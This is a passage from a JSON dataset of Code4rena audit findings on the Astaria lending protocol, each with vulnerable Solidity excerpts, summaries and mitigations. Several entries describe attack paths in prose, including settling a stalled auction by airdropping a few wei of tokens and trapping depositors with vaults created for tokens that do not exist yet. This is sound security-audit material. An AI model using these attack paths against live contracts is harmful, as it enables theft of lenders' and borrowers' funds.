\\_locateCurrentAmount, this utility function comes from seaport.\n\n<https://github.com/ProjectOpenSea/seaport/blob/f402dac8b3faabdb8420d31d46759f47c9d74b7d/contracts/lib/AmountDeriver.sol#L38>\n\nIf no one buys the dutch auction, the price will drop to until 1000 WEI, which means \\_locateCurrentAmount returns lower and lower price.\n\nIn normal flow, if no one buys the dutch auction and covers the outstanding debt, the NFT can be claimabled by liquidator. The liquidator can try to sell NFT again to cover the debt and loss for lenders.\n\nHowever, if no one wants to buy the dutch auction and the \\_locateCurrentAmount is low enough, for example, 10000 WEI, an adversary can transfer 10001 WEI of ERC20 payment token to the ClearingHouse contract.\n\nThen call safeTransferFrom to settle the auction.\n\nThe code below will execute\n\n```solidity\nuint256 payment = ERC20(paymentToken).balanceOf(address(this));\n\nrequire(payment >= currentOfferPrice, \"not enough funds received\");\n```\n\nBecause the airdropped ERC20 balance make the payment larger than currentOfferPrice.\n\nIn this case, the adversary blocks the liquidator from claiming the not-auctioned liquidated NFT.\n\nThe low amount of payment 10001 WEI is not likely to cover the outstanding debt and the lender has to bear the loss.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol validate the caller of the safeTransferFrom in ClearingHouse is the seaport / conduict contract and check that when the auction is settled, the NFT ownership changed and the Astaria contract does not hold the NFT any more.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the ClearingHouse contract of the Astaria protocol. This contract is used to settle auctions and lacks proper access control. The function safeTransferFrom is used to settle the auction but does not have sufficient access control. This means that an adversary can transfer a small amount of ERC20 tokens to the contract and call the safeTransferFrom function, which will cause the auction to be settled. This will prevent the liquidator from claiming the not-auctioned liquidated NFT and the lender will bear the loss.\n\nWe recommend the protocol validate the caller of the safeTransferFrom in ClearingHouse is the seaport / conduict contract and check that when the auction is settled, the NFT ownership changed and the Astaria contract does not hold the NFT any more.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/112",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "ladboy233"
      ]
    },
    {
      "id": "25845",
      "title": "[M-29] `PublicVault.processEpoch` updates `YIntercept` incorrectly when `totalAssets() <= expected`",
      "impact": "MEDIUM",
      "content": "\nWhen `processEpoch` is called it calculates amount of `withdrawReserve` that will be sent to the withdraw proxy. Later it updates `yIntercept` variable.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L275-L337>\n\n```solidity\n  function processEpoch() public {\n    // check to make sure epoch is over\n    if (timeToEpochEnd() > 0) {\n      revert InvalidState(InvalidStates.EPOCH_NOT_OVER);\n    }\n    VaultData storage s = _loadStorageSlot();\n\n\n    if (s.withdrawReserve > 0) {\n      revert InvalidState(InvalidStates.WITHDRAW_RESERVE_NOT_ZERO);\n    }\n\n\n    WithdrawProxy currentWithdrawProxy = WithdrawProxy(\n      s.epochData[s.currentEpoch].withdrawProxy\n    );\n\n\n    // split funds from previous WithdrawProxy with PublicVault if hasn't been already\n    if (s.currentEpoch != 0) {\n      WithdrawProxy previousWithdrawProxy = WithdrawProxy(\n        s.epochData[s.currentEpoch - 1].withdrawProxy\n      );\n      if (\n        address(previousWithdrawProxy) != address(0) &&\n        previousWithdrawProxy.getFinalAuctionEnd() != 0\n      ) {\n        previousWithdrawProxy.claim();\n      }\n    }\n\n\n    if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) {\n      revert InvalidState(InvalidStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO);\n    }\n\n\n    // reset liquidationWithdrawRatio to prepare for re calcualtion\n    s.liquidationWithdrawRatio = 0;\n\n\n    // check if there are LPs withdrawing this epoch\n    if ((address(currentWithdrawProxy) != address(0))) {\n      uint256 proxySupply = currentWithdrawProxy.totalSupply();\n\n\n      s.liquidationWithdrawRatio = proxySupply\n        .mulDivDown(1e18, totalSupply())\n        .safeCastTo88();\n\n\n      currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);\n      uint256 expected = currentWithdrawProxy.getExpected();\n\n\n      unchecked {\n        if (totalAssets() > expected) {\n          s.withdrawReserve = (totalAssets() - expected)\n            .mulWadDown(s.liquidationWithdrawRatio)\n            .safeCastTo88();\n        } else {\n          s.withdrawReserve = 0;\n        }\n      }\n      _setYIntercept(\n        s,\n        s.yIntercept -\n          totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)\n      );\n      // burn the tokens of the LPs withdrawing\n      _burn(address(this), proxySupply);\n    }\n```\n\nThe part that we need to investigate is this.\n\n```solidity\nunchecked {\n        if (totalAssets() > expected) {\n          s.withdrawReserve = (totalAssets() - expected)\n            .mulWadDown(s.liquidationWithdrawRatio)\n            .safeCastTo88();\n        } else {\n          s.withdrawReserve = 0;\n        }\n      }\n      _setYIntercept(\n        s,\n        s.yIntercept -\n          totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)\n      );\n```\n\nIn case if `totalAssets() > expected` then `withdrawReserve` is `totalAssets() - expected` multiplied by `liquidationWithdrawRatio`.\n\nThat means that `withdrawReserve` amount will be sent of public vault to the withdraw proxy, so total assets should decrease by this amount.\n\nIn this case call of `_setYIntercept` below is correct.\n\nHowever in case when `totalAssets() <= expected` then `withdrawReserve` is set to 0, that means that nothing will be sent to the withdraw proxy. But `_setYIntercept` is still called in this case and total assets is decreased, but should not.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nIn case when `totalAssets() <= expected` do not call `_setYIntercept`.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the PublicVault.sol code. When the `processEpoch` function is called, it calculates the amount of `withdrawReserve` to be sent to the withdraw proxy and updates the `yIntercept` variable. However, if the `totalAssets()` is less than or equal to the `expected`, the `withdrawReserve` is set to 0, meaning nothing will be sent to the withdraw proxy. However, the `_setYIntercept` function is still called, which decreases the total assets, even though it should not. The tools used to investigate this bug was VsCode and the recommended mitigation steps is to not call the `_setYIntercept` function if `totalAssets()` is less than or equal to the `expected`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/124",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "25844",
      "title": "[M-28] Lack of support for ERC20 token that is not 18 decimals",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L66><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L73>\n\nLack of support for ERC20 token that is not 18 decimals in PublicVault.sol.\n\n### Proof of Concept\n\nWe need to look into the PublicVault.sol implementation\n\n```solidity\ncontract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {\n```\n\nthe issue that is the decimal precision in the PublicVault is hardcoded to 18\n\n```solidity\nfunction decimals()\n\tpublic\n\tpure\n\tvirtual\n\toverride(IERC20Metadata)\nreturns (uint8)\n{\n\treturn 18;\n}\n```\n\nAccording to\n\n<https://eips.ethereum.org/EIPS/eip-4626>\n\n> Although the convertTo functions should eliminate the need for any use of an EIP-4626 Vault’s decimals variable, it is still strongly recommended to mirror the underlying token’s decimals if at all possible, to eliminate possible sources of confusion and simplify integration across front-ends and for other off-chain users.\n\nThe solmate ERC4626 implementation did mirror the underlying token decimals\n\n<https://github.com/transmissions11/solmate/blob/3998897acb502fa7b480f505138a6ae1842e8d10/src/mixins/ERC4626.sol#L38>\n\n```solidity\nconstructor(\n\tERC20 _asset,\n\tstring memory _name,\n\tstring memory _symbol\n) ERC20(_name, _symbol, _asset.decimals()) {\n\tasset = _asset;\n}\n```\n\nbut the token decimals is over-written to 18 decimals.\n\n<https://github.com/d-xo/weird-erc20#low-decimals>\n\nSome tokens have low decimals (e.g. USDC has 6). Even more extreme, some tokens like Gemini USD only have 2 decimals.\n\nFor example, if the underlying token is USDC and has 6 decimals, the convertToAssets() function will be broken.\n\n<https://github.com/transmissions11/solmate/blob/3998897acb502fa7b480f505138a6ae1842e8d10/src/mixins/ERC4626.sol#L130>\n\n```solidity\nfunction convertToAssets(uint256 shares) public view virtual returns (uint256) {\n\tuint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n\treturn supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);\n}\n```\n\nThe totalSupply is in 18 deimals, but the totalAssets is in 6 deciimals, but the totalSupply should be 6 decimals as well to match the underlying token precision.\n\nThere are place that the code assume the token is 18 decimals, if the token is not 18 decimals, the logic for liquidatoin ratio calculation is broken as well because the hardcoded 1e18 is used.\n\n```solidity\ns.liquidationWithdrawRatio = proxySupply\n.mulDivDown(1e18, totalSupply())\n.safeCastTo88();\n\ncurrentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);\nuint256 expected = currentWithdrawProxy.getExpected();\n\nunchecked {\nif (totalAssets() > expected) {\n  s.withdrawReserve = (totalAssets() - expected)\n\t.mulWadDown(s.liquidationWithdrawRatio)\n\t.safeCastTo88();\n} else {\n  s.withdrawReserve = 0;\n}\n}\n_setYIntercept(\ns,\ns.yIntercept -\n  totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)\n);\n```\n\nAnd in the claim function for WithdrawProxy.sol\n\n```solidity\nif (balance < s.expected) {\n  PublicVault(VAULT()).decreaseYIntercept(\n\t(s.expected - balance).mulWadDown(1e18 - s.withdrawRatio)\n  );\n} else {\n  PublicVault(VAULT()).increaseYIntercept(\n\t(balance - s.expected).mulWadDown(1e18 - s.withdrawRatio)\n  );\n}\n```\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol make the PublicVault.sol decimal match the underlying token decimals.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/129)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the lack of support for ERC20 tokens with decimals other than 18 in the PublicVault.sol implementation. The code in the PublicVault.sol is hardcoded to 18 decimals, which means that tokens with a different decimal precision will not function correctly. This is an issue because it can cause confusion and complicate integration across front-ends and other off-chain users. \n\nTo illustrate this, the example of USDC is used, which is a token with 6 decimals. If this token is used, the convertToAssets() function will be broken. This is because the totalSupply is in 18 deimals, but the totalAssets is in 6 decimals, but the totalSupply should be 6 decimals as well to match the underlying token precision. In addition, the logic for liquidation ratio calculation is also broken because the hardcoded 1e18 is used.\n\nThe recommended mitigation steps for this bug are for the protocol to make the PublicVault.sol decimal match the underlying token decimals. This has been confirmed by SantiagoGregory (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/129",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "ladboy233"
      ]
    },
    {
      "id": "25843",
      "title": "[M-27] Approved operator of collateral owner can't liquidate lien",
      "impact": "MEDIUM",
      "content": "\nIf someone wants to liquidate lien then `canLiquidate` function [is called](https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L625-L627) to check if it's possible.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L611-L619>\n\n```soldiity\n  function canLiquidate(ILienToken.Stack memory stack)\n    public\n    view\n    returns (bool)\n  {\n    RouterStorage storage s = _loadRouterSlot();\n    return (stack.point.end <= block.timestamp ||\n      msg.sender == s.COLLATERAL_TOKEN.ownerOf(stack.lien.collateralId));\n  }\n```\n\nAs you can see owner of collateral token can liquidate lien in any moment.<br>\nHowever approved operators of owner can't do that, however they should.\n\nAs while validating commitment it's allowed for approved operator [to request a loan](https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L237-L244).\n\nThat means that owner of collateral token can approve some operators to allow them to work with their debts.\n\nSo they should be able to liquidate loan as well.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nAdd ability for approved operators to liqiudate lien.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/133)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about the `canLiquidate` function in the AstariaRouter.sol code. This function is used to check if it is possible to liquidate a lien. The code shows that the owner of the collateral token can liquidate the lien in any moment. However, approved operators of the owner cannot do this, even though they should be able to. This is because while validating a commitment, it is allowed for the approved operators to request a loan. This means that the owner of the collateral token can approve some operators to work with their debts, so they should also be able to liquidate the loan. The recommended mitigation steps for this bug are to add the ability for approved operators to liquidate lien. SantiagoGregory (Astaria) has confirmed this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/133",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "25842",
      "title": "[M-26] CollateralToken should allow to execute token owner's action to approved addresses",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L274><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L266><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L238>\n\nLet us look into the code below in `VaultImplementation#_validateCommitment`\n\n```solidity\nfunction _validateCommitment(\nIAstariaRouter.Commitment calldata params,\naddress receiver\n) internal view {\nuint256 collateralId = params.tokenContract.computeId(params.tokenId);\nERC721 CT = ERC721(address(COLLATERAL_TOKEN()));\naddress holder = CT.ownerOf(collateralId);\naddress operator = CT.getApproved(collateralId);\nif (\n  msg.sender != holder &&\n  receiver != holder &&\n  receiver != operator &&\n  !CT.isApprovedForAll(holder, msg.sender)\n) {\n  revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n}\n```\n\nthe code check should also check that `msg.sender != operator` to make the check complete, if the msg.sender comes from an approved operator, the call should be valid.\n\n```solidity\nif (\n  msg.sender != holder &&\n  receiver != holder &&\n  receiver != operator &&\n  msg.sender != operator &&\n  !CT.isApprovedForAll(holder, msg.sender)\n) {\n  revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n}\n```\n\nAND\n\nCollateralToken functions flashAction, releaseToAddress are restricted to the owner of token only. But they should be allowed for approved addresses as well.\n\nFor example, in flashAuction, only the owner of the collateral token can start the flashAction, then approved operator by owner cannot start flashAction.\n\n```solidity\n  function flashAction(\n    IFlashAction receiver,\n    uint256 collateralId,\n    bytes calldata data\n  ) external onlyOwner(collateralId) {\n```\n\nNote the check onlyOwner(collateralId) does not check if the msg.sender is an approved operator.\n\n```solidity\nmodifier onlyOwner(uint256 collateralId) {\n\trequire(ownerOf(collateralId) == msg.sender);\n\t_;\n}\n```\n\n### Recommended Mitigation Steps\n\nAdd ability for approved operators to call functions that can be called by the collateral token owner.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/134)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the code in the Astaria project's VaultImplementation and CollateralToken smart contracts. In the VaultImplementation contract, the code needs to be updated to check if the `msg.sender` is the same as the operator in order to make the check complete. In the CollateralToken contract, functions flashAction and releaseToAddress are restricted to the owner of the token only, but should be allowed for approved addresses as well.\n\nThe recommended mitigation steps are to add the ability for approved operators to call functions that can be called by the collateral token owner. This was confirmed by SantiagoGregory (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/134",
      "tags": [],
      "finders": [
        "ladboy233"
      ]
    },
    {
      "id": "25841",
      "title": "[M-25] Vault can be created for not-yet-existing ERC20 tokens, which allows attackers to set traps to steal NFTs from Borrowers",
      "impact": "MEDIUM",
      "content": "\nThere is a subtle difference between the implementation of solmate’s SafeTransferLib and OZ’s SafeERC20: OZ’s SafeERC20 checks if the token is a contract or not, solmate’s SafeTransferLib does not.<br>\nSee: <https://github.com/Rari-Capital/solmate/blob/main/src/utils/SafeTransferLib.sol#L9><br>\nNote that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.<br>\nAs a result, when the token’s address has no code, the transaction will just succeed with no error.<br>\nThis attack vector was made well-known by the qBridge hack back in Jan 2022.\n\nIn AstariaRouter, Vault, PublicVault, VaultImplementation, ClearingHouse, TransferProxy, and WithdrawProxy, the `safetransfer` and `safetransferfrom` don't check the existence of code at the token address. This is a known issue while using solmate’s libraries.\n\nHence this can lead to miscalculation of funds and also loss of funds , because if safetransfer() and safetransferfrom() are called on a token address that doesn’t have contract in it, it will always return success. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.\n\nSo this will lead to miscalculation and loss of funds.\n\n### Attack scenario (example):\n\nIt’s becoming popular for protocols to deploy their token across multiple networks and when they do so, a common practice is to deploy the token contract from the same deployer address and with the same nonce so that the token address can be the same for all the networks.\n\nA sophisticated attacker can exploit it by taking advantage of that and setting traps on multiple potential tokens to steal from the borrowers. For example: 1INCH is using the same token address for both Ethereum and BSC; Gelato's `$GEL` token is using the same token address for Ethereum, Fantom and Polygon.\n\n*   ProjectA has TokenA on another network;\n*   ProjectB has TokenB on another network;\n*   ProjectC has TokenC on another network;\n*   A malicious strategist (Bob) can create new PublicVaults with amounts of 10000E18 for TokenA, TokenB, and TokenC.\n*   A few months later, ProjectB lunched TokenB on the local network at the same address;\n*   Alice as a liquidator deposited 11000e18 TokenB into the vault;\n*   The attacker (Bob) can withdraw to receive most of Alice's added TokenB.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L490><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L795><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L66><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L72><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L384><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L394><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L406><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L161><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L34><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L269><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L281><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L298>\n\n### Recommended Mitigation Steps\n\nThis issue won’t exist if OpenZeppelin’s SafeERC20 is used instead.\n\n**[androolloyd (Astaria) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/158#issuecomment-1404011644):**\n > The protocol has no enforcement of the assets that can be listed, only tokens that are known should be interacted with by users and UI implementations.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/158)**\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/158#issuecomment-1443332368):**\n > Keeping this report as medium due to the credibility of the attack path described.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code of AstariaRouter, Vault, PublicVault, VaultImplementation, ClearingHouse, TransferProxy, and WithdrawProxy. These functions use solmate's SafeTransferLib which does not check if the token is a contract or not, unlike OZ's SafeERC20. This can lead to the successful transfer of funds to a token address that does not have any contract code, resulting in the miscalculation and loss of funds.\n\nThis was demonstrated in an example attack scenario. A malicious strategist (Bob) created new PublicVaults with amounts of 10000E18 for three different tokens on different networks. When Alice as a liquidator deposited 11000e18 TokenB into the vault, the attacker (Bob) was able to withdraw most of Alice's added TokenB.\n\nThe bug was identified by referencing the code in the Github repository. Recommended mitigation steps include using OpenZeppelin’s SafeERC20 instead of solmate’s library. The severity of the bug was decreased to Medium due to the credibility of the attack path described.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/158",
      "tags": [
        "Token Existence",
        "External Call"
      ],
      "finders": [
        "pwnforce"
      ]
    },
    {
      "id": "25840",
      "title": "[M-24] FlashAuction doesn't pass the initiator to the recipient",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/CollateralToken.sol#L307-L310>\n\nExisting flashloans pass the initiator to the recipient in the function's params, e.g. [AAVE](https://github.com/aave/aave-v3-core/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol#L29) or [Uniswap](https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol#L4). It's done to allow the recipient to verify the legitimacy of the call.\n\nThe CollateralToken's `flashAction()` function doesn't pass the initiator. That makes it more difficult to integrate the flashAction functionality. To protect yourself against other people executing the callback you have to:\n\n*   create a flag\n*   add an authorized function that sets the flag to true\n*   only allow `onFlashAction()` to be executed when the flag is true\n\nConsidering that most people won't bother with that there's a significant risk of this being abused. While this doesn't affect the Astaria protocol directly, it potentially affects its users and their funds. Because of that, I decided to rate it as MEDIUM.\n\n### Proof of Concept\n\n`onFlashAction()` is executed with the ERC721 token data (contract addr, ID, and return address) as well as the arbitrary `data` bytes.\n\n```sol\nreceiver.onFlashAction(\n        IFlashAction.Underlying(s.clearingHouse[collateralId], addr, tokenId),\n        data\n      )\n```\n\n### Recommended Mitigation Steps\n\nAdd the initiator to the callback to allow easy authentication.\n\n**[androolloyd (Astaria) acknowledged](https://github.com/code-423n4/2023-01-astaria-findings/issues/166)**\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/166#issuecomment-1441327414):**\n > Considering the number of exploits we've seen with this, this is nearly high severity in my opinion.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been identified in the CollateralToken's `flashAction()` function of the Astaria protocol. This function does not pass the initiator to the recipient in the function's params, which makes it difficult to integrate the flashAction functionality. This could potentially be abused by malicious actors, thus posing a risk to users and their funds. To mitigate this, the initiator should be added to the callback to allow for easy authentication. This has been acknowledged by androolloyd (Astaria) and commented on by Picodes (judge) who considers it nearly high severity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/166",
      "tags": [],
      "finders": [
        "Ruhum"
      ]
    },
    {
      "id": "25839",
      "title": "[M-23] Function `withdraw()` and `redeem()` in ERC4626RouterBase would revert always because they have unnecessary allowance setting",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L48><br>\n<https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L62>\n\nFunctions withdraw() and redeem()  in ERC4626RouterBase  are used to withdraw user funds from vaults and they call `vault.withdraw()` and `vault.redeem()` and logics in vault transfer user shares and user required to give spending allowance for vault and there is no need for ERC4626RouterBase to set approval for vault and because those approved tokens won't be used and code uses `safeApprove()` so next calls to `withdraw()` and `redeem()` would revert because code would tries to change allowance amount while it's not zero. those functions would revert always and AstariaRouter uses them and user won't be able to use those function and any other protocol integrating with Astaria calling those function would have broken logic. also if UI interact with protocol with router functions then UI would have broken parts too. and functions in router support users to set slippage allowance and without them users have to interact with vault directly and they may lose funds because of the slippage.\n\n### Proof of Concept\n\nThis is `withdraw()` and `redeem()` code in ERC4626RouterBase:\n\n      function withdraw(\n        IERC4626 vault,\n        address to,\n        uint256 amount,\n        uint256 maxSharesOut\n      ) public payable virtual override returns (uint256 sharesOut) {\n\n        ERC20(address(vault)).safeApprove(address(vault), amount);\n        if ((sharesOut = vault.withdraw(amount, to, msg.sender)) > maxSharesOut) {\n          revert MaxSharesError();\n        }\n      }\n\n      function redeem(\n        IERC4626 vault,\n        address to,\n        uint256 shares,\n        uint256 minAmountOut\n      ) public payable virtual override returns (uint256 amountOut) {\n\n        ERC20(address(vault)).safeApprove(address(vault), shares);\n        if ((amountOut = vault.redeem(shares, to, msg.sender)) < minAmountOut) {\n          revert MinAmountError();\n        }\n      }\n\nAs you can see the code sets approval for vault to spend routers vault tokens and then call vault function. This is `_redeemFutureEpoch()` code in the vault which handles withdraw and redeem:\n\n      function _redeemFutureEpoch(\n        VaultData storage s,\n        uint256 shares,\n        address receiver,\n        address owner,\n        uint64 epoch\n      ) internal virtual returns (uint256 assets) {\n        // check to ensure that the requested epoch is not in the past\n\n        ERC20Data storage es = _loadERC20Slot();\n\n        if (msg.sender != owner) {\n          uint256 allowed = es.allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n          if (allowed != type(uint256).max) {\n            es.allowance[owner][msg.sender] = allowed - shares;\n          }\n        }\n\n        if (epoch < s.currentEpoch) {\n          revert InvalidState(InvalidStates.EPOCH_TOO_LOW);\n        }\n        require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n        // check for rounding error since we round down in previewRedeem.\n\n        //this will underflow if not enough balance\n        es.balanceOf[owner] -= shares;\n\n        // Cannot overflow because the sum of all user\n        // balances can't exceed the max uint256 value.\n        unchecked {\n          es.balanceOf[address(this)] += shares;\n        }\n\n        emit Transfer(owner, address(this), shares);\n        // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch\n        _deployWithdrawProxyIfNotDeployed(s, epoch);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        // WithdrawProxy shares are minted 1:1 with PublicVault shares\n        WithdrawProxy(s.epochData[epoch].withdrawProxy).mint(shares, receiver);\n      }\n\nAs you can see this code only checks spending allowance that real owner of shares gives to the `msg.sender` and there is no check or updating spending allowance of the router vaulttokens for vault. so those approvals in the `withdraw()` and `redeem()` are unnecessary and they would cause code to revert always because code tries to set approval with `safeApprove()` while the current allowance is not zero.\n\nThis issue would cause calls to withdraw() and redeem() function to revert. any other protocol integrating with Astaria using those functions would have broken logic and also users would lose gas if they use those functions. contract AstariaRouter inherits ERC4626RouterBase and uses its `withdraw()` and `redeem()` function so users can't call `AstariaRouter.withdraw()` or `AstariaRouter.redeem()`which supports slippage allowance and they have to call vault's functions directly and they may lose funds because of the slippage.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nRemove unnecessary code.\n\n**[androolloyd (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/175)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the functions `withdraw()` and `redeem()` in the ERC4626RouterBase contract. These functions are used to withdraw user funds from vaults and they call `vault.withdraw()` and `vault.redeem()` and logics in the vault transfer user shares. The code uses `safeApprove()` which sets an approval for the vault to spend router vault tokens. The problem is that there is no need for ERC4626RouterBase to set approval for the vault and because those approved tokens won't be used, the code tries to change allowance amount while it's not zero, causing calls to `withdraw()` and `redeem()` to revert. This issue would cause any other protocol integrating with Astaria using those functions to have broken logic and users would lose gas if they use those functions. Furthermore, users would have to call vault's functions directly, which may lead to lost funds due to slippage.\n\nThe recommended mitigation steps for this issue are to remove the unnecessary code. Androolloyd (Astaria) has confirmed the bug report.",
      "quality_score": 1,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/175",
      "tags": [
        "Allowance",
        "Approve",
        "ERC4626",
        "SafeApprove",
        "EIP-4626"
      ],
      "finders": [
        "unforgiven",
        "adriro"
      ]
    },
    {
      "id": "25838",
      "title": "[M-22] `ERC4626RouterBase.withdraw` can only be called once",
      "impact": "MEDIUM",
